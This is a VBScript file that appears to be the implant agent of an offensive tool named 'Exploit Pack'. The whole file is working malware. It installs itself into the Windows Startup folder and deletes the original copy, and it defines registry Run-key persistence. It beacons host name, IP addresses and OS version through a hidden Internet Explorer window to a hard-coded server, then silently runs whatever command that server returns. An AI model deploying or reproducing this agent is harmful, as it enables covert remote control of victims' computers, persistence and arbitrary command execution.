'Define basic variables
Const INSTALL_LOCATION = "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
Const RUN_AFTER_INSTALL = True
If ScriptLocation <> GetInstallLocation Then
    InstallScript RUN_AFTER_INSTALL
End If
Set wshNetwork = CreateObject( "WScript.Network" )
'DELETETHISLINE http://127.0.0.1/&  CookieID & sendHostUrl & sendBrowserName & sendOSType & RESPONSE DATA & 1 & AgentUN & myCurrentIP
AgentUN = "jsacco"
urlServer = "http://10.4.21.137:8000/agent/&"
remoteIPService = "http://checkip.amazonaws.com/&"
CookieID = wshNetwork.ComputerName
runThis = ""
sendHostUrl = GetIPAddress
sendOSType = GetOS
'MyCurrentIP = GetRemoteIP
'MsgBox(GetRemoteIP) 
SendMagic CookieID,sendHostUrl,"Internet Explorer",sendOSType,"Hello underlying OS! :-)",AgentUN, GetIPAddress
Command(runThis)

' Connect back to Exploit Pack
Function SendMagic(CookieID,sendHostUrl,SendBrowserName,sendOSType,ResponseData,AgentUN,MyCurrentIP)
	Set Magic = CreateObject("InternetExplorer.Application")
	Magic.visible = 0
	Magic.navigate urlServer & CookieID & "&" & sendHostUrl & "&" & SendBrowserName & "&" & sendOSType & "&" & ResponseData & "&1&" & AgentUN & "&" & MyCurrentIP
	Do While Magic.Busy
	   WScript.Sleep 100  ' Prevents script host from going crazy waiting for IE
	   Exit Do                  
	Loop
	HTTPGet = Magic.document.documentelement.outerhtml
	Magic.quit
	' Call CleanInput to obtain the commands to run
	runThis = CleanInput(HTTPGet)
	Set Magic = Nothing
End Function

Function Command(run)
	Err.Clear
	On Error Resume Next
	Set oShell = CreateObject ("WScript.Shell")
	oShell.run run
	If Err.Number <> 0 Then
		'Dont show errors
	End If
End Function

' TODO Critical: Fix all this hardcode non-sense temporary iterations used for testing
Function CleanInput(HTTPGet)
	arrLines = Split(HTTPGet, "//")
    For Each strLine In arrLines
    	If InStr(strLine, "OS=") Then
			StrClean = strLine
    	End If
    Next
    arrLineFix = Split(StrClean, "</body></html>" )
    For Each strClean In arrLineFix
     	If InStr(strClean, "") Then
			arrCleanFix = strClean
	End If
    Next
    arrReturn = Split(arrCleanFix, "------------------------------------------------------------" )
    For Each strReturn In arrReturn
     	If InStr(strReturn, "") Then
			StrFinalFix = strReturn		
	End If
    Next
    arrFinalFix = Split(StrFinalFix, "OS=" )
    For Each strFinal In arrFinalFix
     	If InStr(strFinal, "") Then
			Output = strFinal		
	End If
    Next
    CleanInput = Output
End Function

' Get local IP address 
Function GetIPAddress()
	ipaddress = ""
	strComputer = "."
	
	Set objWMIService = GetObject("winmgmts:" _ 
	  & "{impersonationLevel=impersonate}!\\" _
	  & strComputer & "\root\cimv2")
	Set IPConfigSet = objWMIService.ExecQuery("Select " _ 
	  & "IPAddress from Win32_NetworkAdapterConfiguration " _ 
	  & "WHERE IPEnabled = 'True'")
	
	For Each IPConfig in IPConfigSet
	 If Not IsNull(IPConfig.IPAddress) Then
	 For i = LBound(IPConfig.IPAddress) To UBound(IPConfig.IPAddress)
	  If Not Instr(IPConfig.IPAddress(i), ":") > 0 Then
	  ipaddress = ipaddress & IPConfig.IPAddress(i) & vbCrLf
	  End If
	 Next
	 End If
	Next
	GetIPAddress = ipaddress
End Function

'Self destruct this agent
Function SelfDestruct()
	Set objFSO = CreateObject( "Scripting.FileSystemObject" )
	objFSO.DeleteFile WScript.ScriptFullName
	WScript.Quit
End Function

Sub Persistence()
	const HKEY_LOCAL_MACHINE = &H80000001
	strComputer = "."
	Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\"&_ 
		strComputer & "\root\default:StdRegProv")

	strKeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
	KeyPath = "Software\Microsoft\Windows\CurrentVersion\Run\ExploitPack"
	strValueName = "ExploitPack"
	strValue = "wscript.exe %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\exploitpack.vbs"


	Return = objReg.CreateKey(HKEY_LOCAL_MACHINE, KeyPath)
	If (Return = 0) And (Err.Number = 0) Then   
		Wscript.Echo "Key created"

		' Write string value to key    
		Return = objReg.SetStringValue( _
			HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue)
		If (Return = 0) And (Err.Number = 0) Then 
			Wscript.Echo "Key value set"
		Else
			Wscript.Echo "Key value set. Error = " & Err.Number
		End If
	Else
		Wscript.Echo "Key creation. Error = " & Err.Number
	End If
End Sub


' Get OS version
Function GetOS()
	Dim objWMI
	Set objWMI=GetObject("winmgmts://" & "." ).InstancesOf("win32_operatingsystem")
	For Each OS In objWMI
	  GetOS=OS.Caption
	Next
End Function


''''''''''''''''''''''''''''''

 
 
'############################################
' SUB ROUTINES
'############################################
 
 
'Install the script
Sub InstallScript(p_bRunAfterInstall)
    'Initialise
    Dim objFSO, objShell
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = Wscript.CreateObject("WScript.Shell")
     
    'If the install directory does not exist, create it (using a call out to the DOS command MKDIR
    If Not objFSO.FolderExists(GetInstallLocation) Then ExecCmd "mkdir """ & GetInstallLocation & """"
 
    'Copy the new script file into the install directory
    objFSO.CopyFile WScript.ScriptFullName, GetInstallLocation, true
     
    'Give the OS some time to copy if it is a bit laggy - seen occasional issues here
    Dim intCounter
    Const WAIT_MS = 100
    Const MAXTIME_MS = 4000
    intCounter = 0
    Do While Not(objFSO.FileExists(InstalledScriptPath) OR  intCounter > (MAXTIME_MS/WAIT_MS))
        WScript.Sleep WAIT_MS
        intCounter = intCounter + 1
    Loop
    'If the script wasn't copied output an error message, otherwise run if required.
    If objFSO.FileExists(InstalledScriptPath) Then
        If p_bRunAfterInstall then objShell.Run """" & InstalledScriptPath & """"
        SelfDestruct
    Else
        MsgBox "Installation timed out.", vbCritical, "Installation"
    End If
End Sub
 
 
'Execute a DOS command
Sub ExecCmd(p_strDOSCmd)
    Dim objCommand
    Set objCommand = New clsDOSCommandExecutor
  
    objCommand.ExecuteCommand(p_strDOSCmd)
End Sub
 
 
'############################################
' FUNCTIONS
'############################################
 
'Return the directory the script is in
Function ScriptLocation()
    ScriptLocation = Replace(WScript.ScriptFullName, WScript.ScriptName, "")
End Function
 
 
'Return the full path to the installed script
Function InstalledScriptPath()
    InstalledScriptPath = GetInstallLocation & WScript.ScriptName
End Function
 
 
'Return the installation directory with environment variables expanded
Function GetInstallLocation()
    GetInstallLocation = SubstituteEnvironmentVariables(INSTALL_LOCATION)
End Function
 
 
'Replace environment variables in a string (delimited by %'s) with the expanded values
Function SubstituteEnvironmentVariables(p_strInput)
    Dim objShell
    Dim astrInput, intItem
    Set objShell = Wscript.CreateObject("WScript.Shell")
     
    'Tokenise the input on percentages and initialise the return string
    astrInput = Split(p_strInput, "%")
    SubstituteEnvironmentVariables = ""
     
    'Work through the elements and carry out any substitutions
    For intItem = 0 to (UBound(astrInput))
        'If we're on an odd item it must be an environment variable
        If IsOdd(intItem) Then
            'Expand the environment variable
            SubstituteEnvironmentVariables = SubstituteEnvironmentVariables & objShell.ExpandEnvironmentStrings("%" & astrInput(intItem) & "%")
        Else
            SubstituteEnvironmentVariables = SubstituteEnvironmentVariables & astrInput(intItem)
        End If
    next
End Function
 
 
'Determine if a number is odd
Function IsOdd(p_intValue)
    'Set default
    IsOdd = false
     
    'Now check if there's a remainder from modulo 2
    If p_intValue mod 2 = 1 Then IsOdd = true
End Function
 
'############################################
' CLASSES
'############################################
 
'DOS command execution class
'Based on http://www.thoughtasylum.com/blog/2009/8/8/dos-command-class-for-vbscript.html
'Slight modification to enforce command extensions to be on as MKDIR will require this.
Class clsDOSCommandExecutor
    Dim objShell, objExec
    Dim strCommand
    Dim strError
    Dim objError
    Dim objOutput
    Dim strOutput
  
    Sub ExecuteCommand(p_strCommand)
        strCommand = "cmd /E:ON /c " & p_strCommand
        Set objShell = CreateObject("Wscript.Shell" )
  
        objShell.Exec(strCommand)
  
        Set objExec = objShell.Exec(strCommand)
  
        Do Until objExec.Status
            Wscript.Sleep 200
        Loop
  
        Set objError = objExec.StdErr
        strError = objError.ReadAll
  
        Set objOutput = objExec.stdOut
        strOutput = objOutput.ReadAll
    End Sub
  
    Function GetOutput()
        GetOutput = strOutput
    End Function
  
    Function GetError()
        GetError = strError
    End Function
  
    Function Failed()
        If strError = "" Then
            Failed = false
        Else
            Failed = true
        End If
    End Function
End Class